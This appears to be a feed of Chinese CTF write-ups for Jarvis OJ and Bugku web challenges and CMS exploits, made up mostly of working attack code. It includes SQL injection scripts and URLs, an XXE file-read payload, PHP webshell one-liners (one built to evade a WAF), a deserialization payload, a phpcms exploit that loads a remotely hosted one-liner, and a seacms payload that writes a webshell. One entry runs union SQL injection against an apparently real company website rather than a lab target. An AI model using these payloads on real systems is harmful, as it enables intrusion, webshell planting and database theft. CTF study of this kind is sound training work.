catch(e) &#123; var IEXHRVers =["Msxml3.XMLHTTP","Msxml2.XMLHTTP","Microsoft.XMLHTTP"]; for (var i=0,len=IEXHRVers.length;i&lt; len;i++) &#123; try &#123;xhr = new ActiveXObject(IEXHRVers[i]);&#125; catch(e) &#123;continue;&#125; &#125; &#125; return xhr; &#125;function send()&#123; evil_input = document.getElementById("evil-input").value; var xhr = XHR(); xhr.open("post","/api/v1.0/try",true); xhr.onreadystatechange = function () &#123; if (xhr.readyState==4 &amp;&amp; xhr.status==201) &#123; data = JSON.parse(xhr.responseText); tip_area = document.getElementById("tip-area"); tip_area.value = data.task.search+data.task.value; &#125; &#125;; xhr.setRequestHeader("Content-Type","application/json"); xhr.send('&#123;"search":"'+evil_input+'","value":"own"&#125;');&#125; 可以知道向/api/v1.0/try发送post请求。抓包改包，将Content-Type改为application/xml，然后post数据如下:&lt;?xml version="1.0" encoding="utf-8"?&gt;&lt;!DOCTYPE root [&lt;!ENTITY file SYSTEM "file:////home/ctf/flag.txt"&gt;]&gt;&lt;root&gt;&amp;file;&lt;/root&gt; simple inject#coding:utf-8import requestsimport stringpayloads=string.printableurl = 'http://web.jarvisoj.com:32787/login.php'#ye= "'/**/or/**/if(substring((select/**/database())/**/from/**/%s/**/for/**/1)='%s',0,1)/**/and/**/'1'='1"#ye= "'/**/or/**/if(substring((select/**/group_concat(table_name)/**/from/**/information_schema.columns/**/where/**/table_schema=database())/**/from/**/%s/**/for/**/1)='%s',0,1)/**/and/**/'1'='1"ye = "'/**/or/**/if(substring((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name='admin')/**/from/**/%s/**/for/**/1)='%s',0,1)/**/and/**/'1'='1"#ye = "'/**/or/**/if(substring((select/**/password/**/from/**/admin)/**/from/**/%s/**/for/**/1)='%s',0,1)/**/and/**/'1'='1"def exp(i,x): data=&#123;'username':ye%(i,x),'password':'123'&#125; response = requests.post(url,data = data) if response.text.find('用户名错误')&gt;0: return 1 else : return 0ans=''print('start')for i in range(1,100): for x in payloads: if exp(i,x)==1: ans+=x print(ans) break Easy Galleryhttp://web.jarvisoj.com:32785/index.php?page=submithttp://web.jarvisoj.com:32785/index.php?page=view 从以上连接猜测是文件包含在submit中上传一张一句话木马jpg图片，然后在view页面中找到，该图片的地址。访问http://web.jarvisoj.com:32785/index.php?page=uploads/1520757670.jpg 显示打开失败，从报错消息中得知，查询时，给图片加上php后缀。 fopen(uploads/1520757670.jpg.php): failed to open stream: No such file or directory in /opt/lampp/htdocs/index.php on line 24No such file! %00截断，得到flag，一开始只是上传一张图片，没有flag，上传有一句话的图片，才得到flag，搞不到为什么？http://web.jarvisoj.com:32785/index.php?page=uploads/1520757670.jpg%00 ps:一句话图片可以用edjpgcom制作，一句话为&lt;script language="php"&gt;@eval($_POST['Qianye']);&lt;/script&gt; Chopperflag在管理员的手里最近一直遇到源码泄露，习惯性地index.php~,得到源码，打开后有点乱，在kail中，file index.php 得到信息index.php: Vim swap file, version 7.4.添加后缀为index.php.swp ,vi -r index.php.swp得到如下整齐的源码。&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;Web 350&lt;/title&gt;&lt;style type="text/css"&gt; body &#123; background:gray; text-align:center; &#125;&lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;?php $auth = false; $role = "guest"; $salt = if (isset($_COOKIE["role"])) &#123; $role = unserialize($_COOKIE["role"]); $hsh = $_COOKIE["hsh"]; if ($role==="admin" &amp;&amp; $hsh === md5($salt.strrev($_COOKIE["role"]))) &#123; $auth = true; &#125; else &#123; $auth = false; &#125; &#125; else &#123; $s = serialize($role); setcookie('role',$s); $hsh = md5($salt.strrev($s)); setcookie('hsh',$hsh); &#125; if ($auth) &#123; echo "&lt;h3&gt;Welcome Admin. Your flag is &#125; else &#123; echo "&lt;h3&gt;Only Admin can see the flag!!&lt;/h3&gt;"; &#125; ?&gt; &lt;/body&gt;&lt;/html&gt; strtev re?UDF-mysql IN A Mess查看页面源码，访问index.phps得到源码&lt;?phperror_reporting(0);echo "&lt;!--index.phps--&gt;";if(!$_GET['id'])&#123; header('Location: index.php?id=1'); exit();&#125;$id=$_GET['id'];$a=$_GET['a'];$b=$_GET['b'];if(stripos($a,'.'))&#123; echo 'Hahahahahaha'; return ;&#125;$data = @file_get_contents($a,'r');if($data=="1112 is a nice lab!" and $id==0 and strlen($b)&gt;5 and eregi("111".substr($b,0,1),"1114") and substr($b,0,1)!=4)&#123; require("flag.txt");&#125;else&#123; print "work harder!harder!harder!";&#125;?&gt; 当$a为php://input，$data可以通过php://input来接受post数据。$id传一个字符进去，会被转换为0。对$b，要求长度大于5，其次要求满足eregi的要求和首字母不为4。可以设置$b为%00123456，这样，substr（）会发生截断，在匹配时时进行eregi(“111”,”1114”)满足，同时%00对strlen不会发生截断。火狐发送post请求http://web.jarvisoj.com:32780/index.php?id=a&amp;a=php://input&amp;b=%001234561112 is a nice lab! 得到Come ON!!! {/^HT2mCpcvOLf} 访问http://web.jarvisoj.com:32780//^HT2mCpcvOLf 连接自动补全猜测是注入，过滤了空格，union,select,from 查看字段数http://web.jarvisoj.com:32780/%5EHT2mCpcvOLf/index.php?id=1/*1*/order/*1*/by/*1*/3# 查看显示位http://web.jarvisoj.com:32780/%5EHT2mCpcvOLf/index.php?id=-1/*1*/uunionnion/*1*/selecselectt/*1*/1,2,3# 查表http://web.jarvisoj.com:32780/%5EHT2mCpcvOLf/index.php?id=-1/*1*/uunionnion/*1*/selecselectt/*1*/1,2,(selselectect/*1*/group_concat(table_name)/*1*/frofromm/*1*/information_schema.tables/*1*/where/*1*/table_schema=database())%23 查字段http://web.jarvisoj.com:32780/%5EHT2mCpcvOLf/index.php?id=-1/*1*/uunionnion/*1*/selecselectt/*1*/1,2,(selselectect/*1*/group_concat(column_name)/*1*/frofromm/*1*/information_schema.columns/*1*/where/*1*/table_name=0x636F6E74656E74)%23 脱裤http://web.jarvisoj.com:32780/%5EHT2mCpcvOLf/index.php?id=-1/*1*/uunionnion/*1*/selecselectt/*1*/1,2,(selselectect/*1*/group_concat(context)/*1*/frofromm/*1*/content)%23 神盾局的秘密访问图片链接http://web.jarvisoj.com:32768/showimg.php?img=aW5kZXgucGhw 得到&lt;?php require_once('shield.php'); $x = new Shield(); isset($_GET['class']) &amp;&amp; $g = $_GET['class']; if (!empty($g)) &#123; $x = unserialize($g); &#125; echo $x-&gt;readfile();?&gt; 将shield.php精心base64加密，接在img=后面，访问以下连接http://web.jarvisoj.com:32768/showimg.php?img=c2hpZWxkLnBocA== 得到&lt;?php //flag is in pctf.php class Shield &#123; public $file; function __construct($filename = '') &#123; $this -&gt; file = $filename; &#125; function readfile() &#123; if (!empty($this-&gt;file) &amp;&amp; stripos($this-&gt;file,'..')===FALSE &amp;&amp; stripos($this-&gt;file,'/')===FALSE &amp;&amp; stripos($this-&gt;file,'\\')==FALSE) &#123; return @file_get_contents($this-&gt;file); &#125; &#125; &#125;?&gt; 使用以下的脚本&lt;?php class Shield &#123; public $file = "pctf.php"; &#125; $qianye = new Shield(); print_r(serialize($qianye));?&gt; 访问以下链接，查看源码，得到flaghttp://web.jarvisoj.com:32768/index.php?class=O:6:%22Shield%22:1:&#123;s:4:%22file%22;s:8:%22pctf.php%22;&#125; LoginSQL injection with raw MD5 hashesbp抓包，在应答包中发现Hint: &quot;select * fromadminwhere password=&#39;&quot;.md5($pass,true).&quot;&#39;&quot;在之前的做题中遇到过。直接提交ffifdyop,得到flag LOCALHOST添加X-Forwarded-For: 127.0.01 PORT51因为校园网，出路由的时候会变端口，所以在vps上跑sudo curl --local-port 51 http://web.jarvisoj.com:32770/]]></content>
      <categories>
        <category>ctf</category>
        <category>web</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[bugku的代码审计和社工]]></title>
    <url>%2Fposts%2Fecb3eea4.html</url>
    <content type="text"><![CDATA[都做过了，在做一遍，刷理一下思绪。php函数漏洞详细总结 extract变量覆盖&lt;?php$flag='xxx';extract($_GET);if(isset($shiyan))&#123;$content=trim(file_get_contents($flag));if($shiyan==$content)&#123;echo'flag&#123;xxx&#125;';&#125;else&#123;echo'Oh.no';&#125;&#125;?&gt; 变量覆盖漏洞构造?shiyan&amp;content= strcmp比较字符串&lt;?php$flag = &quot;flag&#123;xxxxx&#125;&quot;;if (isset($_GET[&apos;a&apos;])) &#123; if (strcmp($_GET[&apos;a&apos;], $flag) == 0) //如果 str1 小于 str2 返回 &lt; 0； 如果 str1大于 str2返回 &gt; 0；如果两者相等，返回 0。 //比较两个字符串（区分大小写） die(&apos;Flag: &apos;.$flag); else print &apos;No&apos;;&#125;?&gt; strcmp漏洞php5.3之前构造?a[] urldecode二次编码绕过&lt;?phpif(eregi("hackerDJ",$_GET[id])) &#123;echo("not allowed!");exit();&#125;$_GET[id] = urldecode($_GET[id]);if($_GET[id] == "hackerDJ")&#123;echo "Access granted!";echo "flag";&#125;?&gt; 对hackDJ进行url编码两次即可 MD5函数&lt;?phperror_reporting(0);$flag = 'flag&#123;test&#125;';if (isset($_GET['username']) and isset($_GET['password'])) &#123;if ($_GET['username'] == $_GET['password'])print 'Your password can not be your username.';else if (md5($_GET['username']) === md5($_GET['password']))die('Flag: '.$flag);elseprint 'Invalid password';&#125;?&gt; md5函数引起的问题一开始用?username=240610708&amp;password=!1793422703!不成功，以为是题目错了。后来利用php的md5()函数有一个缺陷（MD5是不能处理数组的，md5(数组)会返回null），这里是===，只能用数组处理，构造payload: ?username[]=123&amp;password[]=12 数组返回NULL绕过&lt;?php$flag = "flag";if (isset ($_GET['password'])) &#123;if (ereg ("^[a-zA-Z0-9]+$", $_GET['password']) === FALSE)echo 'You password must be alphanumeric';else if (strpos ($_GET['password'], '--') !== FALSE)die('Flag: ' . $flag);elseecho 'Invalid password';&#125;?&gt; ereg遇到数组会返回null,null!==FALSE也不===FALSEpayloadpassword[] sha()函数比较绕过&lt;?php$flag = "flag";if (isset($_GET['name']) and isset($_GET['password']))&#123;var_dump($_GET['name']);echo "";var_dump($_GET['password']);var_dump(sha1($_GET['name']));var_dump(sha1($_GET['password']));if ($_GET['name'] == $_GET['password'])echo 'Your password can not be your name!';else if (sha1($_GET['name']) === sha1($_GET['password']))die('Flag: '.$flag);elseecho 'Invalid password.';&#125;elseecho 'Login first!';?&gt; 利用了sha1函数处理数组返回null.payload: ?name[]=1&amp;password[]=3 md5加密相等绕过&lt;?php$md51 = md5('QNKCDZO');$a = @$_GET['a'];$md52 = @md5($a);if(isset($a))&#123;if ($a != 'QNKCDZO' &amp;&amp; $md51 == $md52) &#123;echo "flag&#123;*&#125;";&#125; else &#123;echo "false!!!";&#125;&#125;else&#123;echo "please input a";&#125;?&gt; 构造payload:?a=240610708 十六进制与数字比较&lt;?phperror_reporting(0);function noother_says_correct($temp)&#123;$flag = 'flag&#123;test&#125;';$one = ord('1'); //ord — 返回字符的 ASCII 码值$nine = ord('9'); //ord — 返回字符的 ASCII 码值$number = '3735929054';// Check all the input characters!for ($i = 0; $i &lt; strlen($number); $i++)&#123;// Disallow all the digits!$digit = ord($temp&#123;$i&#125;);if ( ($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine) )&#123;// Aha, digit not allowed!return "flase";&#125;&#125;if($number == $temp)return $flag;&#125;$temp = $_GET['password'];echo noother_says_correct($temp);?&gt; 换一种进制?password=0xdeadc0de ereg正则%00截断&lt;?php$flag = "xxx";if (isset ($_GET['password']))&#123;if (ereg ("^[a-zA-Z0-9]+$", $_GET['password']) === FALSE)&#123;echo 'You password must be alphanumeric';&#125;else if (strlen($_GET['password']) &lt; 8 &amp;&amp; $_GET['password'] &gt; 9999999)&#123;if (strpos ($_GET['password'], '-') !== FALSE) //strpos — 查找字符串首次出现的位置&#123;die('Flag: ' . $flag);&#125;else&#123;echo('- have not been found');&#125;&#125;else&#123;echo 'Invalid password';&#125;&#125;?&gt; ereg存在%00截断漏洞，所以构造截断 绕过第一个条件，第二个条件长度要小于8值要大于999999，所以用科学计数法绕过，又要包含-，所以payload: ?1e9%00-页面返回-没有发现，果断把payload换成?le9%00*-* strpos数组绕过&lt;?php$flag = "flag";if (isset ($_GET['ctf'])) &#123;if (@ereg ("^[1-9]+$", $_GET['ctf']) === FALSE)echo '必须输入数字才行';else if (strpos ($_GET['ctf'], '#biubiubiu') !== FALSE)die('Flag: '.$flag);elseecho '骚年，继续努力吧啊~';&#125;?&gt; 构造 ?ctf[]` 或者?ctf=1%00%23biubiubiu 密码张三名字的第一个字母和生日组合 信息查找通过百度查找bugku.cn 就能找到一条主机屋网站遭到黑客攻击，黑客爆出联系方式。里面的群qq就是 简单的个人信息收集zip压缩包，猜测伪加密，在winhex中打开，找到504B0102从50算起，的第九和第十个字节全部都改成00。成功得到一些信息。然后去社工吧。#]]></content>
      <categories>
        <category>ctf</category>
        <category>web</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[bugku的web进阶]]></title>
    <url>%2Fposts%2Fb1db4319.html</url>
    <content type="text"><![CDATA[一些cms网站的实战，挺多不会做的，以后再来补做一下。 phpcmsv9直接给pocpost请求http://120.24.86.145:8001/index.php?m=member&amp;c=index&amp;a=register&amp;siteid=1 siteid=1&amp;modelid=11&amp;username=q12w312415&amp;password=12w121346&amp;email=wwq1w3124156@qq.com&amp;info[content]=&lt;img src=http://p4gdp8beq.bkt.clouddn.com/qy.txt?.php#.jpg&gt;&amp;dosubmit=1&amp;protocol= 注意，src为一句话文本的地址，每次请求用户名，邮箱都要改变 海洋cmsseacms6.45漏洞利用seacms6.55漏洞任意执行phpinfo()中的一些重要信息不会插入一句话，请教了舍友。POST请求http://120.24.86.145:8008/search.php?searchtype=5searchtype=5&amp;searchword=&#123;if&#123;searchpage:year&#125;&amp;year=:e&#123;searchpage:area&#125;&#125;&amp;area=v&#123;searchpage:letter&#125;&amp;letter=al&#123;searchpage:lang&#125;&amp;yuyan=(join&#123;searchpage:jq&#125;&amp;jq=($_P&#123;searchpage:ver&#125;&amp;ver=OST[9]))&amp;9[]=fwrite(&amp;9[]=fopen('QIANYE.php','w')&amp;9[]=,'&lt;?php eval($_POST["QIANYE"]);?&gt;'); sql实战注入2用椰树扫一下找到注入点查看字段数http://www.kabelindo.co.id/readnews.php?id=99999999 order by 5 %23 一开始只列出本网站数据库的表名，把最后一个表名添加上去，一直显示错误。最后，才明白要列出本数据库中表名的最后一个才是。列出mysql数据库中所有的表名http://www.kabelindo.co.id/readnews.php?id=99999999 union select 1,2,3,table_name,4 from information_schema.tables sql实战1]]></content>
      <categories>
        <category>ctf</category>
        <category>web</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[BugKu的web题]]></title>
    <url>%2Fposts%2Fe1368ef8.html</url>
    <content type="text"><![CDATA[一个真心觉得挺好的平台，挺照顾小白的，题多，知识点涉及范围广，可以学到很多。 BugKu 矛盾$num=$_GET['num'];if(!is_numeric($num))&#123;echo $num;if($num==1)echo 'flag&#123;**********&#125;';&#125; payload?num=1a web3在游览器中禁止javascript的运行，查看源码可得&amp;#75;&amp;#69;&amp;#89;&amp;#123;&amp;#74;&amp;#50;&amp;#115;&amp;#97;&amp;#52;&amp;#50;&amp;#97;&amp;#104;&amp;#74;&amp;#75;&amp;#45;&amp;#72;&amp;#83;&amp;#49;&amp;#49;&amp;#73;&amp;#73;&amp;#73;&amp;#125; 进行unicode解码 sql注入查看源码注意到 gb2312编码，易知识宽字节注入。一开始直接用#，一直显示不出结果。判断字段数103.238.227.13:10083/?id=1%df' order by 2 %23 查看回显103.238.227.13:10083/?id=1%df' union select 1,2 %23 得到表名103.238.227.13:10083/?id=1%df' union select 1, (select group_concat(table_name) from information_schema.tables where table_schema=database() )%23 字段名103.238.227.13:10083/?id=1%df' union select 1, (select group_concat(column_name) from information_schema.columns where table_name=0x6B6579 )%23 脱裤103.238.227.13:10083/?id=1%df' union select 1, (select group_concat(id,0x23,string) from `key`)%23 域名解析window中在hosts上添加下面一条解析语句，访问该域名，即可得到答案120.24.86.145 flag.bugku.com sql注入1部分源码//过滤sql$array = array('table','union','and','or','load_file','create','delete','select','update','sleep','alter','drop','truncate','from','max','min','order','limit');foreach ($array as $value)&#123; if (substr_count($id, $value) &gt; 0) &#123; exit('包含敏感关键字！'.$value); &#125;&#125;//xss过滤$id = strip_tags($id);$query = "SELECT * FROM temp WHERE id=&#123;$id&#125; LIMIT 1"; 发现//xss过滤,会将&lt;&gt;置换掉，从而实现关键字绕过$id = strip_tags($id); 查看字段数http://103.238.227.13:10087/?id=1 o&lt;&gt;rder by 2 --+ 判断显示位http://103.238.227.13:10087/?id=1 un&lt;&gt;ion selec&lt;&gt;t 1,2 --+ 脱裤http://103.238.227.13:10087/?id=1 un&lt;&gt;ion selec&lt;&gt;t 1, (selec&lt;&gt;t hash fro&lt;&gt;m `key` where id=1) %23 你必须让他停下来禁止javascript，通过bp截包，不断的发送请求，就会得到flag 本地文件包含&lt;?php include "waf.php"; include "flag.php"; $a = @$_REQUEST['hello']; eval( "var_dump($a);"); show_source(__FILE__); ?&gt; 构造paylaod?hello=1);show_source(%27flag.php%27);var_dump( 变量1flag In the variable ! &lt;?php error_reporting(0);include "flag1.php";highlight_file(__file__);if(isset($_GET['args']))&#123; $args = $_GET['args']; if(!preg_match("/^\w+$/",$args))&#123; die("args error!"); &#125; eval("var_dump($$args);");&#125;?&gt; 注意到提示和最后一条语句可知，让$$args=全局变量，即可打印出flag的值。?args=GLOBALS web5js编码，控制台，解密可得，提示要大写，把字母全部转换成大写 进行uniocode解密和拼接得到&lt;script&gt;function checkSubmit()&#123;var a=document.getElementById("password");if("undefined"!=typeof a)&#123; if("67d709b2b54aa2aa648cf6e87a7114f1"==a.value) return!0; alert("Error"); a.focus(); return!1&#125;&#125;document.getElementById("levelQuest").onsubmit=checkSubmit;&lt;/script&gt; 在输入框中输入67d709b2b54aa2aa648cf6e87a7114f1 flag在index里根据题意和url便可知构造?file=php://filter/read=convert.base64-encode/resource=index.php 输入密码查看flag#coding:utf-8import requestsimport threadingimport timeurl="http://120.24.86.145:8002/baopo/"s=requests.session()def getflag(pwd): data=&#123;"pwd":pwd&#125; response=s.post(url,data=data) if "密码不正确，请重新输入" not in response.content.decode("utf-8"): print(response.content) print("破解成功") time.sleep(10) exit()for pwd in range(10000,99999): print(pwd) getflag(pwd) 听说备份是是一个好习惯输入index.php.bak得到源码&lt;?php/** * Created by PhpStorm. * User: Norse * Date: 2017/8/6 * Time: 20:22*/include_once "flag.php";ini_set("display_errors", 0);$str = strstr($_SERVER['REQUEST_URI'], '?');$str = substr($str,1);$str = str_replace('key','',$str);parse_str($str);echo md5($key1);echo md5($key2);if(md5($key1) == md5($key2) &amp;&amp; $key1 !== $key2)&#123; echo $flag."取得flag";&#125;?&gt; 双写key绕过?kekeyy1=QNKCDZO&amp;kekeyy2=240610708 成绩单普通注入题判断列数id=1'order by 4 # 判断显示位id=-1' union select 1,2,3,4 %23 表名id=-1' union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=database()),4 %23 字段名id=-1' union select 1,2,(select group_concat(column_name) from information_schema.columns where table_name=0x666C3467),4 %23 脱裤id=-1' union select 1,2,(select group_concat(skctf_flag) from fl4g),4 %23 秋名山司机python正则#coding:utf-8import requestsimport reurl = 'http://120.24.86.145:8002/qiumingshan/'s = requests.session()txt = s.get(url)exp = re.search(r'(\d+[+\-*])+(\d+)', txt.text).group()#print(exp)result = eval(exp)post = &#123;'value': result&#125;print(s.post(url, data = post).content) web 6通过抓包可知，把返回消息头的flag的值base64两次，赋值给margin，post margin，速度要快，该flag的值是会变的，所以只能通过py实现。 #coding:utf-8import requestsimport base64import reurl='http://120.24.86.145:8002/web6/'s=requests.session()header=s.get(url).headersprint(header['flag'])base1=base64.b64decode(header['flag'])#print(type(base1))key=base64.b64decode(re.split(':',str(base1))[1])data=&#123;"margin":key&#125;flag=s.post(url,data=data).contentprint(flag) COOKIE欺骗通过观察url，base64解密，filename,得到keys.txt。猜测文件名被base64编码传入，将index.php进行base64编码，传入，看到&lt;?php， 注意到url中的num参数，修改一下值，发现返回值变了，猜测通过num的值，来返回index.php源码的第几行代码。写个py遍历一下import requestsfor i in range(0,50): url="http://120.24.86.145:8002/web11/index.php?line=%d&amp;filename=aW5kZXgucGhw"%i r=requests.get(url) print(r.text) 可得源码&lt;?phperror_reporting(0);$file=base64_decode(isset($_GET['filename'])?$_GET['filename']:"");$line=isset($_GET['line'])?intval($_GET['line']):0;if($file=='') header("location:index.php?line=&amp;filename=a2V5cy50eHQ="); $file_list = array( '0' =&gt;'keys.txt', '1' =&gt;'index.php', );if(isset($_COOKIE['margin']) &amp;&amp; $_COOKIE['margin']=='margin')&#123; $file_list[2]='keys.php';&#125;if(in_array($file, $file_list))&#123; $fa = file($file); echo $fa[$line];&#125;?&gt; 分析可得，当Cookie:margin=margin 时，keys.php文件，会包含在$file_list数组中，然后在把keys.php进行base64编码，赋值给filename,就会返回flag.?line=&amp;filename=a2V5cy5waHA=Cookie:margin=margin xss过滤了&lt;&gt;,用unicode绕过?id=\u003cimg%20src=1%20onerror=alert(_key_)\u003e never give up访问1p.html，得到源码，对其进行部分base64解码，在url解码可得如下var Words ="&lt;script&gt;window.location.href='http://www.bugku.com';&lt;/script&gt; &lt;!--";if(!$_GET['id'])&#123; header('Location: hello.php?id=1'); exit();&#125;$id=$_GET['id'];$a=$_GET['a'];$b=$_GET['b'];if(stripos($a,'.'))&#123; echo 'no no no no no no no'; return ;&#125;$data = @file_get_contents($a,'r');if($data=="bugku is a nice plateform!" and $id==0 and strlen($b)&gt;5 and eregi("111".substr($b,0,1),"1114") and substr($b,0,1)!=4)&#123; require("f4l2a3g.txt");&#125;else&#123; print "never never never give up !!!";&#125;?&gt;--&gt;" function OutWord()&#123;var NewWords;NewWords = unescape(Words);document.write(NewWords);&#125; OutWord();// --&gt; php://由源码可知，id要和0相等，但是不能为零，这时id只能为字符串。对b的要求长度要大于5,‘111’+b[0]要包含在‘1114’,并且b[0]不等于4,所以用unicode编码，且b前面为%00，让ergegi处理的时候被截断（strlen不会），此时就符合了。a为php://input,php://input可以读取没有处理过的POST数据,post传入的bugku is a nice plateform! 即可。最终请求包为：POST /test/hello.php?id=q&amp;b=%00144565&amp;a=php://input HTTP/1.1Host: 120.24.86.145:8006User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencodedContent-Length: 26X-Forwarded-For: 127.0.0.1, 127.0.0.1Connection: closeUpgrade-Insecure-Requests: 1bugku is a nice plateform! welcome to bugkuctf&lt;!-- $user = $_GET["txt"]; $file = $_GET["file"]; $pass = $_GET["password"]; if(isset($user)&amp;&amp;(file_get_contents($user,'r')==="welcome to the bugkuctf"))&#123; echo "hello admin!&lt;br&gt;"; include($file); //hint.php &#125;else&#123; echo "you are not admin ! "; &#125; --&gt; 过狗一句话&lt;?php $poc="a#s#s#e#r#t"; $poc_1=explode("#",$poc); $poc_2=$poc_1[0].$poc_1[1].$poc_1[2].$poc_1[3].$poc_1[4].$poc_1[5]; $poc_2($_GET['s']) ?&gt; globfileprint_r与var_dump的区别给s赋值，命令执行，先读取文件http://120.24.86.145:8010/?s=print_r(glob(%22*.*%22)) 读取flag.txthttp://120.24.86.145:8010/?s=print_r(file(%22flag.txt%22)) 字符？正则？&lt;?php highlight_file('2.php');$key='KEY&#123;********************************&#125;';$IM= preg_match("/key.*key.&#123;4,7&#125;key:\/.\/(.*key)[a-z][[:punct:]]/i", trim($_GET["id"]), $match);if( $IM )&#123; die('key is: '.$key);&#125;?&gt; php正则表达式php正则匹配规则考查php正则，http://120.24.86.145:8002/web10/?id=key2keykeykeykeykey:/c/keya? 前女友一开始没注意看源码，没注意到源码中有个code.txt链接。&lt;?phpif(isset($_GET['v1']) &amp;&amp; isset($_GET['v2']) &amp;&amp; isset($_GET['v3']))&#123; $v1 = $_GET['v1']; $v2 = $_GET['v2']; $v3 = $_GET['v3']; if($v1 != $v2 &amp;&amp; md5($v1) == md5($v2))&#123; if(!strcmp($v3, $flag))&#123; echo $flag; &#125; &#125;&#125;?&gt; 考查两点1.v1不等于v2,但v1和v2的md5加密后相等2.strcmp漏洞(5.3的之前和之后版本在使用strcmp比较数组和字符串时候的差异。在5.3的版本之后使用这个函数比较会返回0)?v1=QNKCDZO&amp;v2=240610708&amp;v3[]=1 login1sql约束攻击（上次第三届百越杯，就遇到过，被宿友发现，听宿友装了挺久的笔）mysql约束攻击注册admin+无数个空格+1账户，相当于注册admin账户，有着相同的权限，然后就能用admin账户登入了 各种绕过&lt;?php highlight_file('flag.php'); $_GET['id'] = urldecode($_GET['id']); $flag = 'flag&#123;xxxxxxxxxxxxxxxxxx&#125;'; if (isset($_GET['uname']) and isset($_POST['passwd'])) &#123; if ($_GET['uname'] == $_POST['passwd']) print 'passwd can not be uname.'; else if (sha1($_GET['uname']) === sha1($_POST['passwd'])&amp;($_GET['id']=='margin')) die('Flag: '.$flag); else print 'sorry!'; &#125; ?&gt; 1.将margin进行url编码两次，赋值给id2.利用sha1()函数的漏洞来绕过。如果把这两个参数为数组，如：?uname[]=a&amp;passwd[]=b，这样在第一处判断时两数组是不同，但在第二处判断时由于sha1()函数无法处理数组类型，将warning并返回false，false=flase,条件成立。posthttp://120.24.86.145:8002/web7/?id=%25%36%44%25%36%31%25%37%32%25%36%37%25%36%39%25%36%45&amp;uname[]passwd[]=4 web 8&lt;?phpextract($_GET);if (!empty($ac))&#123;$f = trim(file_get_contents($fn));if ($ac === $f)&#123;echo "&lt;p&gt;This is flag:" ." $flag&lt;/p&gt;";&#125;else&#123;echo "&lt;p&gt;sorry!&lt;/p&gt;";&#125;&#125;?&gt; file_put_contents和file_get_contentsphp://input可以读取没有经过处理的post请求http://120.24.86.145:8002/web8/?fn=php://input&amp;ac=qianyeqianye 细心一开始bp抓包，查看包，修改包，没有什么信息，最后，随便尝试一下 ，robots.txt.发现一个不能访问的目录，访问该目录，只看到一行源码if ($_GET[x]==$password) 完全靠猜，感觉没意思，？x=admin，即可得到flag. getwebshell开始尝试%00截断失败。尝试。修改第一个content-type: 将其中的几个字母改成大写，绕过。第二个content-type:改成image/jpg。php别名：php2, php3, php4, php5, phps, pht, phtm, phtml 均尝试修改一下,php5可以。 INSERT INTO注入error_reporting(0);function getIp()&#123;$ip = '';if(isset($_SERVER['HTTP_X_FORWARDED_FOR']))&#123;$ip = $_SERVER['HTTP_X_FORWARDED_FOR'];&#125;else&#123;$ip = $_SERVER['REMOTE_ADDR'];&#125;$ip_arr = explode(',', $ip);return $ip_arr[0];&#125;$host="localhost";$user="";$pass="";$db="";$connect = mysql_connect($host, $user, $pass) or die("Unable to connect");mysql_select_db($db) or die("Unable to select database");$ip = getIp();echo 'your ip is :'.$ip;$sql="insert into client_ip (ip) values ('$ip')";mysql_query($sql); $_SERVERinsert into 攻击的原理requests库的详解py解得import requestsfrom requests import ReadTimeoutimport stringurl="http://120.24.86.145:8002/web15/"strings=string.ascii_lowercase+string.ascii_uppercase+string.digitsflag=""for i in range(1,35): for str0 in strings: payload="11'+(select case when (substring((select flag from flag ) from &#123;0&#125; for 1 )='&#123;1&#125;') then sleep(4) else 1 end ) and '1'='1".format(str(i),str0) header=&#123;"x-forwarded-for": payload&#125; try: response=requests.get(url,headers=header,timeout=3) except ReadTimeout : flag+=str0 print(flag) breakprint(flag) 这是一个神奇的登入框SQL注入-基于报错注入这题的字符串是双引号括起来的，输入”就会报错，然后就是报错注入了，常用的报错语句上面的链接有。直接给出payloadadmin_name=1"and multilinestring((select * from(select * from(select group_concat(flag1) from flag1)a)b)) and "1 &amp;admin_passwd=Qianye&amp;submit=GO+GO+GO 多次sql盲注这道题不懂，感觉是盲注，但是又做不出来 PHP_encrypt_1(ISCCCTF)下载压缩包，后得源码,这道题有加密密文的，可是下载的文件里竟然没有，出题者应该忘记写上了。 &lt;?phpfunction encrypt($data,$key)&#123; $key = md5('ISCC'); $x = 0; $len = strlen($data); $klen = strlen($key); for ($i=0; $i &lt; $len; $i++) &#123; if ($x == $klen) &#123; $x = 0; &#125; $char .= $key[$x]; $x+=1; &#125; for ($i=0; $i &lt; $len; $i++) &#123; $str .= chr((ord($data[$i]) + ord($char[$i])) % 128); &#125; return base64_encode($str);&#125;?&gt; 文件包含查看源码，发现有upload.php页面，上传一个包含一句话的图片，用菜刀连接时，显示_@eval($POST[‘Qianye’] ,猜测&lt;?php ?&gt;被过滤了。可以用用绕过&lt;script language=php&gt;@eval($_POST[pupil]);&lt;/script&gt; 也可以涨个姿势&lt;?=eval($_POST['Qianye']); 还是不成功用大佬的一句话，绕过成功。得到flag文件，并得到upload.php源码,果然是过滤了&lt;?php ?&gt;&lt;?php//error_reporting(0);if(!empty($_FILES["file"]))&#123; $allowedExts = array("gif", "jpeg", "jpg", "png"); @$temp = explode(".", $_FILES["file"]["name"]); $extension = end($temp); if (((@$_FILES["file"]["type"] == "image/gif") || (@$_FILES["file"]["type"] == "image/jpeg") || (@$_FILES["file"]["type"] == "image/jpg") || (@$_FILES["file"]["type"] == "image/pjpeg") || (@$_FILES["file"]["type"] == "image/x-png") || (@$_FILES["file"]["type"] == "image/png")) &amp;&amp; (@$_FILES["file"]["size"] &lt; 102400) &amp;&amp; in_array($extension, 